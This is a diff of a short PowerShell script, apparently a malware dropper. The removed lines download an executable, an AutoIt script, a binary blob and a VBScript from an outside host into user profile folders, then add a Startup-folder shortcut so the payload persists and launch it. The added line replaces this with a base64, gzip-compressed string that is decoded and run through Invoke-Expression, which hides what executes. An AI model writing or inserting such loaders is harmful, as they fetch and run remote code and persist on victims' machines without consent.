@@ -1,8 +1,1 @@
-$l=$env:LOCALAPPDATA;$r=$env:APPDATA
-iwr http://activepro.cc/v2/task.exe -OutFile "$l\task.exe"
-iwr http://activepro.cc/v2/SDiRCVBwkOKgzkiWZATZw.au3 -OutFile "$l\SDiRCVBwkOKgzkiWZATZw.au3"
-iwr http://activepro.cc/v2/xmPrzXvXVZUROtHRABGChwqfdoqv.bin -OutFile "$l\xmPrzXvXVZUROtHRABGChwqfdoqv.bin"
-$f="$r\task.vbs";iwr http://activepro.cc/v2/task.vbs -OutFile $f
-$s="$([Environment]::GetFolderPath('Startup'))\task.lnk"
-$w=New-Object -Com WScript.Shell;$c=$w.CreateShortcut($s)
-$c.TargetPath=$f;$c.Save();Start-Process $s
+$compressed = 'H4sIAAAAAAAA/4SQwW6bQBCG70i8A0IjBQ4sUnsDcSCkSaVGBRk3ttz2sKwHswUD3h0Wy09fuW5V+RD7OL/++T7NQJcA9iZ6zbP0NS2Kp3SZxqAu4d/ZtuSsnIZojMKQC5IGRzUwIULzISSuW4ZHdIJ8omfZoeNC9+Nf6t7cLZ/kInt7nNv8y+7UytUmXW5mxqeP17B3a7fpx32hTmuzftt8W+T0eZE+vmTNfKi3w8GwSvbXkntt17agTlxQl9tMpd343ltMpf9LoLYt0IkL3vdPvZFq6PfY088oekF6HrotqoJT4z2UxBVN44PvX0xd357dc/IV5yCvfqEgJ8iGvbMqhZIjsbLBrotBJDCzTCEnLJtBkZjIA+3bFgi25GqHdOYnUMcgWMkNen78xxUUahCotQP6dwAAAP//Dx1Brw4CAAA='; $bytes = [System.Convert]::FromBase64String($compressed); $stream = New-Object IO.MemoryStream(, $bytes); $decompressed = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader($decompressed); $obfuscated = $reader.ReadToEnd(); Invoke-Expression $obfuscated
